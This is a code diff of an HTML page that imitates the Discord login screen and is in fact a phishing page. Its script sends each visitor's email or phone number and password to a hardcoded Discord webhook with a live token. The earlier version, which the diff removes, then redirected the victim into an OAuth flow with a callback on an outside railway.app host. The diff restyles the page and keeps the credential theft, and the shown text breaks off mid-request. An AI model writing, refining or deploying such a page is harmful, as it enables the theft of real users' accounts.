@@ -1,84 +1,156 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Discord - Login</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          colors: {
-            discord: '#5865F2',
-            dark: '#36393f',
-            darker: '#2f3136',
-          }
-        }
-      }
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600;700&display=swap">
+  <style>
+    :root {
+      --bg-primary: #36393f;
+      --bg-secondary: #2f3136;
+      --text-primary: #dcddde;
+      --text-muted: #b9bbbe;
+      --accent: #5865f2;
+      --accent-hover: #4752c4;
+      --input-bg: #202225;
+      --input-border: #202225;
     }
-  </script>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: var(--bg-secondary);
+      padding: 40px;
+      border-radius: 5px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+    .logo {
+      font-size: 3rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: white;
+    }
+    h1 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    p.subtitle {
+      color: var(--text-muted);
+      margin-bottom: 32px;
+      font-size: 1rem;
+    }
+    label {
+      display: block;
+      text-align: left;
+      font-size: 0.75rem;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: var(--text-muted);
+      text-transform: uppercase;
+    }
+    input {
+      width: 100%;
+      padding: 10px 12px;
+      background: var(--input-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 3px;
+      color: white;
+      font-size: 1rem;
+      margin-bottom: 16px;
+      outline: none;
+    }
+    input:focus {
+      border-color: var(--accent);
+    }
+    .forgot {
+      color: var(--accent);
+      font-size: 0.875rem;
+      text-decoration: none;
+      display: block;
+      margin: 8px 0 24px;
+      text-align: left;
+    }
+    .forgot:hover {
+      text-decoration: underline;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 3px;
+      font-weight: 500;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: var(--accent-hover);
+    }
+    .footer {
+      margin-top: 24px;
+      font-size: 0.875rem;
+      color: var(--text-muted);
+    }
+    .footer a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
-<body class="bg-[#36393f] min-h-screen flex items-center justify-center font-sans text-white">
-  <div class="bg-[#36393f] p-8 rounded-xl w-full max-w-sm shadow-2xl">
-    <div class="text-center mb-8">
-      <h1 class="text-3xl font-bold mb-2">Welcome back!</h1>
-      <p class="text-gray-400">We're so excited to see you again!</p>
-    </div>
+<body>
+  <div class="container">
+    <div class="logo">Discord</div>
+    <h1>Welcome back!</h1>
+    <p class="subtitle">We're so excited to see you again!</p>
 
     <form id="loginForm">
-      <div class="mb-4">
-        <label class="block text-sm font-medium mb-2 uppercase tracking-wide">EMAIL OR PHONE NUMBER</label>
-        <input type="text" id="email" required class="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-discord" />
-      </div>
+      <label>Email or Phone Number</label>
+      <input type="text" id="email" required autocomplete="email" />
 
-      <div class="mb-6">
-        <label class="block text-sm font-medium mb-2 uppercase tracking-wide">PASSWORD</label>
-        <input type="password" id="password" required class="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-discord" />
-      </div>
+      <label>Password</label>
+      <input type="password" id="password" required autocomplete="current-password" />
 
-      <button type="submit" class="w-full py-3 bg-discord hover:bg-[#4752c4] text-white font-semibold rounded transition">
-        Log In
-      </button>
+      <a href="#" class="forgot">Forgot your password?</a>
 
-      <p class="text-center text-sm text-gray-400 mt-4">
-        <a href="#" class="text-discord hover:underline">Forgot your password?</a>
-      </p>
+      <button type="submit">Log In</button>
     </form>
+
+    <div class="footer">
+      Need an account? <a href="#">Register</a>
+    </div>
   </div>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    document.getElementById('loginForm').addEventListener('submit', async e => {
       e.preventDefault();
 
-      const email = document.getElementById('email').value;
+      const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value;
 
-      // Send credentials to webhook
+      if (!email || !password) return;
+
+      // 1. Send credentials
       fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [{
-            title: "New Credentials",
-            color: 0x5865F2,
-            fields: [
-              { name: "Email / Phone", value: email || "—", inline: false },
-              { name: "Password", value: password || "—", inline: false },
-              { name: "Time", value: new Date().toISOString(), inline: false }
-            ]
-          }]
-        })
-      }).catch(() => {});
-
-      // Redirect to Discord OAuth
-      const clientId = '1479876735242731571';
-      const redirectUri = encodeURIComponent('https://sya-production.up.railway.app/callback');
-      const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email`;
-
-      window.location.href = oauthUrl;
-    });
-  </script>
-</body>
-</html>
+            title: "📩 New Login",
+            color
